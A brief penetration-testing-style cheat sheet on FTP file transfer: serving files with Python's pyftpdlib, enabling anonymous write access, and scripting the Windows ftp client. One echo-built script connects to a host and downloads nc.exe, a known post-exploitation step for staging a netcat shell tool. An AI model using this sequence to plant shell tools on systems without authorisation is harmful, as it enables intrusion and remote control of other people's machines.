Serve up with python
apt-get install python-pyftpdlib  
python -m pyftpdlib -p 21

One benefit of using FTP over HTTP is the ability to transfer files both way. If you want to grant the anonymous user write access, add the -w flag as well.

Authenticate with user anonymous and any password

use “s” switch to make FTP take all its input from a file instead:

echo open 192.168.10.155 >> ftp.txt
echo username >> ftp.txt
echo password >> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt

Connect using commands in config.txt
ftp -n -v -s:con­fig.txt 10.2.1­0.14

confi­g.txt:
user uid1234 (username)
uid1234 (password)
quit
